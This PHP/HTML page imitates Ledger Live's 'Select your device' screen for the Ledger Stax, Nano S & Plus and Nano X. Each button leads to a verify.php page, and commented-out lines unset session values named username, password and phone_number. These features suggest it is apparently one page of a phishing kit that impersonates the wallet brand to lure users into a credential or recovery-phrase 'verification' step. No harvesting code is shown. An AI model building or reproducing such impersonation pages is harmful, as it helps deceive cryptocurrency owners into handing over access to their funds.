<?php include_once './config.php';?>
<html lang="en">
    <?php
//        unset($_SESSION['username']);
//        unset($_SESSION['password']);
//        unset($_SESSION['phone_number']);
    
        $title = 'Ledger Live';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-4 position-relative section py35">
                    <a class="text-decoration-none text-white py10 px20 fs13 rounded-pill prev_btn" href="<?= base_url()?>">
                        <svg stroke="currentColor" fill="none" stroke-width="1.5" viewBox="0 0 24 24" aria-hidden="true" class="fs20 me10" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M6.75 15.75 3 12m0 0 3.75-3.75M3 12h18"></path></svg>Previous
                    </a>
                    <div class="position-absolute w-100 text-center" style="top: 30%; left: 0px;">
                        <img src="<?= base_url('assets/img/ledgerstax.png')?>" alt="Ledger Stax" class="imgmove1 img-fluid" style="filter: invert(1); height: 220px;" />
                        <h3 class="mobile_web_font fw-semibold">Ledger Stax</h3>
                        <a class="btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14" href="<?= base_url('verify.php')?>">Select</a>
                    </div>
                </div>
                <div class="col-sm-4 position-relative section py35">
                    <div class="text-center" style="">
                        <img src="<?= base_url('assets/img/ledger.png')?>" alt="Logo" width="80" title="CRYPTOCURRENCY &amp; NFT WALLET" class="d-inline-block align-text-top" style="filter: invert(1);" />
                        <h2 class="h6 mobile_web_font pt20">SELECT YOUR DEVICE</h2>
                    </div>
                    <div class="position-absolute w-100 text-center" style="top: 30%; left: 0px;">
                        <img src="<?= base_url('assets/img/ledgernano.png')?>" alt="Ledger Nano S &amp; Plus" class="imgmove1 img-fluid" style="filter: invert(1); height: 220px;" />
                        <h3 class="mobile_web_font fw-semibold ls-1">Ledger Nano S &amp; Plus</h3>
                        <a class="btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14" href="<?= base_url('verify.php')?>">Select</a>
                    </div>
                </div>
                <div class="col-sm-4 position-relative section py35">
                    <div class="position-absolute w-100 text-center" style="top: 30%; left: 0px;">
                        <img src="<?= base_url('assets/img/ledgernanox.png')?>" alt="Ledger Nano X" class="imgmove1 img-fluid" style="filter: invert(1); height: 220px;"/>
                        <h3 class="mobile_web_font fw-semibold">Ledger Nano X</h3>
                        <a class="btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14" href="<?= base_url('verify.php')?>">Select</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>